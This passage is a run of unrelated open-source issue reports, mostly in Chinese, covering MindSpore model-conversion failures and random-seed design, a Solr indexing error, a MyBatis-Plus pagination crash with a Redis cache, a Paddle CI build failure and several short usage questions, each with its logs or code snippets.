[graph_manager.cc:678]82931 PreRunOptimizeOriginalGraph: ErrorNo: -1(failed) Failed to process GraphManager_stages.preparer.PrepareDynShape [ERROR] GE(82931,main):2021-03-18-02:55:22.004.025 [graph_manager.cc:808]82931 PreRun: ErrorNo: -1(failed) Run PreRunOptimizeOriginalGraph failed for graph:30856_30855_1_construct_wrapper [ERROR] GE(82931,main):2021-03-18-02:55:22.006.818 [graph_manager.cc:883]82931 StartForRunGraph: ErrorNo: -1(failed) PreRun Failed. graph_id:0. [ERROR] GE(82931,main):2021-03-18-02:55:22.006.864 [graph_manager.cc:1260]82931 BuildGraph: ErrorNo: 1343242268(PreRun failed.) [BuildGraph] StartForRunGraph failed! graph_id:0. [ERROR] GE(82931,main):2021-03-18-02:55:22.006.897 [ge_generator.cc:926]82931 BuildModel: ErrorNo: 1343266819(Graph manager build graph failed.) GraphManager build graph fail, graph id: 0 [ERROR] GE(82931,main):2021-03-18-02:55:22.006.915 [ge_generator.cc:571]82931 GenerateModel: ErrorNo: 1343266819(Graph manager build graph failed.) Build model failed. [ERROR] GE(82931,main):2021-03-18-02:55:22.007.052 [ge_ir_build.cc:531]82931 BuildModel: ErrorNo: 1343266819(Graph manager build graph failed.) GenerateOnlineModel failed! [ERROR] ME(82931,main):2021-03-18-02:55:22.007.183 [mindspore/ccsrc/cxx_api/model/acl/model_converter.cc:131] BuildAirModel] Call aclgrphBuildModel fail. [ERROR] ME(82931,main):2021-03-18-02:55:22.970.145 [mindspore/ccsrc/cxx_api/model/acl/model_converter.cc:191] operator()] Convert model from MindIR to OM failed [ERROR] ME(82931,main):2021-03-18-02:55:22.972.879 [mindspore/ccsrc/cxx_api/model/model_converter_utils/multi_process.cc:128] ChildProcess] Child process process failed [INFO] ME(82931,main):2021-03-18-02:55:23.036.906 [mindspore/ccsrc/cxx_api/model/model_converter_utils/multi_process.cc:68] MainProcess] Model converter: child process sleep waiting for exit signal. [WARNING] ME(82863,main):2021-03-18-02:55:23.061.004 [mindspore/ccsrc/cxx_api/model/model_converter_utils/multi_process.cc:200] HeartbeatThreadFuncInner] Peer stopped [ERROR] ME(82863,main):2021-03-18-02:55:23.061.646 [mindspore/ccsrc/cxx_api/model/acl/model_converter.cc:171] operator()] Receive result model from child process failed [ERROR] ME(82863,main):2021-03-18-02:55:23.064.291 [mindspore/ccsrc/cxx_api/model/model_converter_utils/multi_process.cc:107] ParentProcess] Parent process process failed [INFO] ME(82863,main):2021-03-18-02:55:23.073.004 [mindspore/ccsrc/cxx_api/model/model_converter_utils/multi_process.cc:76] MainProcess] Model converter: parent process kills child of fork. [INFO] ME(82863,main):2021-03-18-02:55:24.074.123 [mindspore/ccsrc/cxx_api/model/model_converter_utils/multi_process.cc:83] MainProcess] Child process 82931 exits success. [ERROR] ME(82863,main):2021-03-18-02:55:24.086.651 [mindspore/ccsrc/cxx_api/model/acl/model_converter.cc:204] LoadMindIR] Convert MindIR model to OM model failed [ERROR] ME(82863,main):2021-03-18-02:55:24.086.677 [mindspore/ccsrc/cxx_api/model/acl/acl_model.cc:68] Build] Load MindIR failed. EEEEEEEERROR Build failed."
"[CT][MS][AtLeast2D] 算子在交付件测试用例中是异常用例，捕获type error,但是报错提示信息有误","在CPU 两种模式下 运行 test_functional_atleast_2d_implicit_type_conversion() 出现反向报错，正向通过的情况，但是报错信息却是有问题。不清楚这个算子是否支持隐式类型转换 请确认一下 def test_functional_atleast_2d_implicit_type_conversion(): x1 = Tensor(np.array(np.random.randn(4, 2, 3)).astype(np.float16)) x2 = Tensor(np.array(np.random.randn(3, 2)).astype(np.float32)) #net = AtLeast2D() #fact = AnyNetFactory(net=net) # with pytest.raises((TypeError, SyntaxError)): #fact(x1, x2) input_x = [x1, x2] fact = AtLeast2DMock(inputs=[input_x]) fact.forward_cmp() /mode graph   <code>: fact.grad_cmp()"
Solr 下创建索引时出错,"我在 XWiki 13.3 版本下的全文搜索引擎（使用 Solr 8.8.0）配置了 Jcseg 2.6.2 分词器。 但开启索引后出现大量如下错误信息（但还是能索引成功），还请帮忙看一下是什么原因，如何避免类似报错信息？谢谢！   <code>: 2021-04-30 09:08:34,269 [XWiki Solr index thread] ERROR o.a.s.h.RequestHandlerBase - org.apache.solr.common.SolrException: Exception writing document id xwiki:CKEditor.Config_zh_CN to the index; possible analysis error: startOffset must be non-negative, and endOffset must be &gt;= startOffset, and offsets must not go backwards startOffset=1,endOffset=5,lastStartOffset=129 for field 'object.CKEditor.ConfigClass_zh_CN' at org.apache.solr.update.DirectUpdateHandler2.addDoc(DirectUpdateHandler2.java:249) at org.apache.solr.update.processor.RunUpdateProcessorFactory$RunUpdateProcessor.processAdd(RunUpdateProcessorFactory.java:73) at org.apache.solr.update.processor.UpdateRequestProcessor.processAdd(UpdateRequestProcessor.java:55) at org.apache.solr.update.processor.NestedUpdateProcessorFactory$NestedUpdateProcessor.processAdd(NestedUpdateProcessorFactory.java:79) at org.apache.solr.update.processor.UpdateRequestProcessor.processAdd(UpdateRequestProcessor.java:55) at org.apache.solr.update.processor.DistributedUpdateProcessor.doLocalAdd(DistributedUpdateProcessor.java:256) at org.apache.solr.update.processor.DistributedUpdateProcessor.doVersionAdd(DistributedUpdateProcessor.java:495) at org.apache.solr.update.processor.DistributedUpdateProcessor.lambda$versionAdd$0(DistributedUpdateProcessor.java:336) at org.apache.solr.update.VersionBucket.runWithLock(VersionBucket.java:50) at org.apache.solr.update.processor.DistributedUpdateProcessor.versionAdd(DistributedUpdateProcessor.java:336) at org.apache.solr.update.processor.DistributedUpdateProcessor.processAdd(DistributedUpdateProcessor.java:222) at org.apache.solr.handler.loader.JavabinLoader$1.update(JavabinLoader.java:110) at org.apache.solr.client.solrj.request.JavaBinUpdateRequestCodec$StreamingCodec.readOuterMostDocIterator(JavaBinUpdateRequestCodec.java:343) at org.apache.solr.client.solrj.request.JavaBinUpdateRequestCodec$StreamingCodec.readIterator(JavaBinUpdateRequestCodec.java:291) at org.apache.solr.common.util.JavaBinCodec.readObject(JavaBinCodec.java:338) at org.apache.solr.common.util.JavaBinCodec.readVal(JavaBinCodec.java:283) at org.apache.solr.client.solrj.request.JavaBinUpdateRequestCodec$StreamingCodec.readNamedList(JavaBinUpdateRequestCodec.java:244) at org.apache.solr.common.util.JavaBinCodec.readObject(JavaBinCodec.java:303) at org.apache.solr.common.util.JavaBinCodec.readVal(JavaBinCodec.java:283) at org.apache.solr.common.util.JavaBinCodec.unmarshal(JavaBinCodec.java:196) at org.apache.solr.client.solrj.request.JavaBinUpdateRequestCodec.unmarshal(JavaBinUpdateRequestCodec.java:131) at org.apache.solr.handler.loader.JavabinLoader.parseAndLoadDocs(JavabinLoader.java:122) at org.apache.solr.handler.loader.JavabinLoader.load(JavabinLoader.java:70) at org.apache.solr.handler.UpdateRequestHandler$1.load(UpdateRequestHandler.java:97) at org.apache.solr.handler.ContentStreamHandlerBase.handleRequestBody(ContentStreamHandlerBase.java:82) at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:216) at org.apache.solr.core.SolrCore.execute(SolrCore.java:2646) at org.apache.solr.client.solrj.embedded.EmbeddedSolrServer.request(EmbeddedSolrServer.java:229) at org.apache.solr.client.solrj.SolrRequest.process(SolrRequest.java:214) at org.apache.solr.client.solrj.SolrClient.add(SolrClient.java:177) at org.apache.solr.client.solrj.SolrClient.add(SolrClient.java:138) at org.apache.solr.client.solrj.SolrClient.add(SolrClient.java:156) at org.xwiki.search.solr.internal.AbstractSolrInstance.add(AbstractSolrInstance.java:62) at org.xwiki.search.solr.internal.DefaultSolrIndexer.processBatch(DefaultSolrIndexer.java:410) at org.xwiki.search.solr.internal.DefaultSolrIndexer.run(DefaultSolrIndexer.java:376) at java.lang.Thread.run(Unknown Source) Caused by: java.lang.IllegalArgumentException: startOffset must be non-negative, and endOffset must be &gt;= startOffset, and offsets must not go backwards startOffset=1,endOffset=5,lastStartOffset=129 for field 'object.CKEditor.ConfigClass_zh_CN' at org.apache.lucene.index.DefaultIndexingChain$PerField.invert(DefaultIndexingChain.java:952) at org.apache.lucene.index.DefaultIndexingChain.processField(DefaultIndexingChain.java:524) at org.apache.lucene.index.DefaultIndexingChain.processDocument(DefaultIndexingChain.java:488) at org.apache.lucene.index.DocumentsWriterPerThread.updateDocuments(DocumentsWriterPerThread.java:208) at org.apache.lucene.index.DocumentsWriter.updateDocuments(DocumentsWriter.java:415) at org.apache.lucene.index.IndexWriter.updateDocuments(IndexWriter.java:1471) at org.apache.lucene.index.IndexWriter.updateDocuments(IndexWriter.java:1464) at org.apache.solr.update.DirectUpdateHandler2.updateDocOrDocValues(DirectUpdateHandler2.java:967) at org.apache.solr.update.DirectUpdateHandler2.doNormalUpdate(DirectUpdateHandler2.java:342) at org.apache.solr.update.DirectUpdateHandler2.addDoc0(DirectUpdateHandler2.java:294) at org.apache.solr.update.DirectUpdateHandler2.addDoc(DirectUpdateHandler2.java:241) ... 35 more"
MindSpore随机数管理整合,"RFC 当前，MindSpore在多后端都支持随机数生成，包括CPU,GPU和Ascend，前端图层也提供随机数种子迭代管理的功能。但是目前MindSpore的随机数生成还有如下问题： seed逻辑 seed设置前后端不统一，在前端设置为0时会转化成默认，在后端为0时为采取随机。前端为0等价于后端为，后端为0等价于前端为; CPU和GPU随机数生成算子逻辑一致，Ascend目前处理显式指定seed逻辑有一定特殊性（ #I45FTB:随机状态管理 ），待讨论统一； seed的逻辑，特别是图层的seed与算子seed的配合，缺乏文档解释。 随机算子的后端实现 目前GPU上的部分随机数算子采用朴素的随机数实现，采样效率较差，在部分应用耗时极长,整体算法需要优化； 有的算子（例如dropout)采用自己的内置的随机数逻辑，导致算子拆分前后行为逻辑不统一； 目前随机数算子文件较为分散，有的在math文件夹下有的在random文件下，需要统一合并。 为了提升MindSpore的随机数的整体表现，我们需要 提供统一的seed逻辑和对外设定接口 内部算子实现的整合与统一，提升部分低效算子的计算逻辑 补充文档 Trail No. Task Description Related Issue(URL) 1 2   <code>: seed DEFAULT_GRAPH_SEED seed seed seed seed DEFAULT_GRAPH_SEED seed seed None"
分页 + redis二级缓存报错,"当前使用版本 mybatis-plus-boot-starter 3.4.1 配置了分页插件，单独使用分页无问题！！！ 在mapper层加入redis作为二级缓存，查询报错！！！ 1、mybatis-plus 插件配置   <code>: private Object object = new Object(); private RedisUtil redisUtil; private RedisUtil getRedis() { synchronized (object) { if (redisUtil == null) { redisUtil = ApplictionBeanUtil.getBean(RedisUtil.class); } } return redisUtil; } private final ReadWriteLock readWriteLock = new ReentrantReadWriteLock(); /** * 缓存刷新时间（秒） */ @Setter private long flushInterval = 0L; private String id; public IronSteelMybatisRedisCache() {} public IronSteelMybatisRedisCache(final String id) { if (id == null) { throw new IllegalArgumentException(""Cache instances require an ID""); } this.id = id; } @Override public String getId() { return this.id; } @Override public void putObject(Object o, Object o1) { getRedis().hset(getId(), o.toString(), o1); if (flushInterval &gt; 0L) { getRedis().expire(getId(), flushInterval); } } @Override public Object getObject(Object o) { return getRedis().hget(getId(), o.toString()); } @Override public Object removeObject(Object o) { return getRedis().hdel(getId(), o); } @Override public void clear() { getRedis().del(getId()); } @Override public int getSize() { return getRedis().hsize(getId()); } @Override public ReadWriteLock getReadWriteLock() { return readWriteLock; } 16:03:51.158 [http-nio-8010-exec-1] INFO com.kmtc.dataironsteel.conf.mybatis.IronSteelSqlExecTimeInterceptor - ============== Sql Start ============== Execute Time：8 ms - ID：com.kmtc.dataironsteel.mapper.base.BaseLadleFixMapper.selectPage_mpCount Execute SQL ： SELECT COUNT(*) FROM t_base_ladle_fix ============== Sql End ============== 16:03:51.239 [http-nio-8010-exec-1] ERROR com.kmtc.apimanager.config.aop.exception.ApiExceptionAdvice - 执行方法String com.kmtc.apimanager.api.ironsteel.base.BaseLadleFixController.getList(BaseLadleFix,PageInfo)出错， 参数：[BaseLadleFix(id=null, code=null, name=null, memo=null), com.kmtc.commonbase.util.response.PageInfo@45f39f4e]， 因为：nested exception is org.apache.ibatis.exceptions.PersistenceException: ### Error querying database. Cause: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 ### The error may exist in com/kmtc/dataironsteel/mapper/base/BaseLadleFixMapper.java (best guess) ### The error may involve com.kmtc.dataironsteel.mapper.base.BaseLadleFixMapper.selectPage_mpCount ### The error occurred while handling results ### SQL: SELECT COUNT(*) FROM t_base_ladle_fix ### Cause: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0， 错误详细信息：org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.exceptions.PersistenceException: ### Error querying database. Cause: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 ### The error may exist in com/kmtc/dataironsteel/mapper/base/BaseLadleFixMapper.java (best guess) ### The error may involve com.kmtc.dataironsteel.mapper.base.BaseLadleFixMapper.selectPage_mpCount ### The error occurred while handling results ### SQL: SELECT COUNT(*) FROM t_base_ladle_fix ### Cause: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:92) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:440) at com.sun.proxy.$Proxy149.selectList(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:223) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.executeForIPage(MybatisMapperMethod.java:122) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.execute(MybatisMapperMethod.java:87) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy$PlainMethodInvoker.invoke(MybatisMapperProxy.java:148) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy.invoke(MybatisMapperProxy.java:89) at com.sun.proxy.$Proxy150.selectPage(Unknown Source) at com.kmtc.dataironsteel.service.base.impl.BaseLadleFixServiceImpl.getList(BaseLadleFixServiceImpl.java:50) at com.kmtc.dataironsteel.service.base.impl.BaseLadleFixServiceImpl$$FastClassBySpringCGLIB$$1.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:687) at com.kmtc.dataironsteel.service.base.impl.BaseLadleFixServiceImpl$$EnhancerBySpringCGLIB$$1.getList(&lt;generated&gt;) at com.kmtc.apimanager.api.ironsteel.base.BaseLadleFixController.getList(BaseLadleFixController.java:44) at com.kmtc.apimanager.api.ironsteel.base.BaseLadleFixController$$FastClassBySpringCGLIB$$1.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:771) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:100) at com.kmtc.apimanager.config.aop.auth.AuthAdvice.doAround(AuthAdvice.java:52) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.springframework.aop.framework.adapter.MethodBeforeAdviceInterceptor.invoke(MethodBeforeAdviceInterceptor.java:56) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:100) at com.kmtc.apimanager.config.aop.execute.ApiExecuteTimeAdvice.doAround(ApiExecuteTimeAdvice.java:50) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) at com.kmtc.apimanager.config.aop.exception.ApiExceptionAdvice.doAround(ApiExceptionAdvice.java:46) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:691) at com.kmtc.apimanager.api.ironsteel.base.BaseLadleFixController$$EnhancerBySpringCGLIB$$1.getList(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) at javax.servlet.http.HttpServlet.service(HttpServlet.java:626) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.__invoke(StandardContextValve.java:96) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:41002) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1589) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) Caused by: org.apache.ibatis.exceptions.PersistenceException: ### Error querying database. Cause: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 ### The error may exist in com/kmtc/dataironsteel/mapper/base/BaseLadleFixMapper.java (best guess) ### The error may involve com.kmtc.dataironsteel.mapper.base.BaseLadleFixMapper.selectPage_mpCount ### The error occurred while handling results ### SQL: SELECT COUNT(*) FROM t_base_ladle_fix ### Cause: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 at org.apache.ibatis.exceptions.ExceptionFactory.wrapException(ExceptionFactory.java:30) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:149) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:140) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:426) ... 114 more Caused by: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 at java.util.ArrayList.rangeCheck(ArrayList.java:659) at java.util.ArrayList.get(ArrayList.java:435) at com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor.willDoQuery(PaginationInnerInterceptor.java:134) at com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor.intercept(MybatisPlusInterceptor.java:59) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:61) at com.sun.proxy.$Proxy268.query(Unknown Source) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:147) ... 120 more"
分页查询排除字段或者延迟加载怎么实现？,"如上代码，分页获取CmsArticle时，不需要CmsArticle的content字段（content字段比较大），如果配置可以使得分页查询的时候不加载content字段，或者getContent的时候再加载？   <code>: public class CmsArticle { @Id @GeneratedValue(strategy = GenerationType.IDENTITY) private Integer id; private String title; private String content; .... } PageHelper.startPage(pageNum, pageSize); Page&lt;CmsArticle&gt; items = (Page&lt;CmsArticle&gt;) articleMapper.selectByExample(example);"
up spring cloud alibaba 2.2.3,v2.2.3 发布，主要修复 v2.2.2 引入BUG. 优化 NacosDiscoveryClient 始终从 Nacosmanager 获取 Namingservice 删除无用 pom 属性 bug 修复 bean 循环依赖问题修复 HeartBeatEvent 无法触发 NacosServiceDiscovery.hostToServiceInstance NPE 问题修复   <code>: &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-alibaba.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; org.springframework.cloud.netflix.zuul.ZuulProxyAutoConfiguration (field private org.springframework.cloud.client.serviceregistry.Registration org.springframework.cloud.netflix.zuul.ZuulProxyAutoConfiguration.registration) ┌─────┐ | nacosRegistration defined in class path resource [com/alibaba/cloud/nacos/registry/NacosServiceRegistryAutoConfiguration.class] ↑ ↓ | nacosProperties (field private java.util.Optional com.alibaba.cloud.nacos.NacosDiscoveryProperties.nacosAutoServiceRegistrationOptional) ↑ ↓ | nacosAutoServiceRegistration defined in class path resource [com/alibaba/cloud/nacos/registry/NacosServiceRegistryAutoConfiguration.class] └─────┘
develop branch build failed on CI manylinux projects,Link: https://paddleci.ngrok.io/viewLog.html?buildId=29857&amp;tab=buildLog&amp;buildTypeId=Manylinux1_CpuNoavxOpenblas&amp;logTab=tail   <code>: [03:05:37] : [Step 1/4] [ 22%] Building CXX object paddle/fluid/operators/math/CMakeFiles/selected_rows_functor.dir/selected_rows_functor.cc.o [03:05:37]W: [Step 1/4] In file included from /paddle/paddle/fluid/operators/math/selected_rows_functor.cc:17:0: [03:05:37]W: [Step 1/4] /paddle/paddle/fluid/operators/math/math_function.h:36:19: fatal error: cblas.h: No such file or directory [03:05:37]W: [Step 1/4] #include &lt;cblas.h&gt; [03:05:37]W: [Step 1/4] ^ [03:05:37]W: [Step 1/4] compilation terminated. [03:05:37]W: [Step 1/4] make[2]: *** [paddle/fluid/operators/math/CMakeFiles/selected_rows_functor.dir/selected_rows_functor.cc.o] Error 1 [03:05:37]W: [Step 1/4] make[1]: *** [paddle/fluid/operators/math/CMakeFiles/selected_rows_functor.dir/all] Error 2 [03:05:37]W: [Step 1/4] make[1]: *** Waiting for unfinished jobs.... [03:05:39]W: [Step 1/4] setparam_OPTERON.c:562:1: warning: initialization from incompatible pointer type [enabled by default] [03:05:39]W: [Step 1/4] }; [03:05:39]W: [Step 1/4] ^ [03:05:39]W: [Step 1/4] setparam_OPTERON.c:562:1: warning: (near initialization for ‘gotoblas_OPTERON.zgeadd_k’) [enabled by default]
lod tensor 如何实现argmax,"想实现的操作： 举例: 现在有一个lodTensor lod为 [ [0, 2, 5] ] data 为 [ [1.1, 2.1, 5.2] , [5.2, 0.1, 4.3] , [0.2, 10.5, 8.3] , [1, 2.5, 3.3] , [7.1, 2.1, 5.9] , ] 想通过一个argmax操作 对axis = -1 得到的 lod 为[ [0, 2, 5] ] data 为 [[2] [0] [1] [2] [0]] 现在的代码为: 目前的问题：结果中softmax_decode 的lod为空的，想问一下如何解决（主要是实现我上面的需求）   <code>: emission = fluid.layers.fc( size=label_dict_len, input=bigru_output, param_attr=fluid.ParamAttr( initializer=fluid.initializer.Uniform( low=-init_bound, high=init_bound), regularizer=fluid.regularizer.L2DecayRegularizer( regularization_coeff=1e-4)) ) softmax_decode = fluid.layers.argmax(x=emission, axis=-1)"
Fix the grammar in copyright.,-&gt;   <code>: All Rights Reserve All Rights Reserved
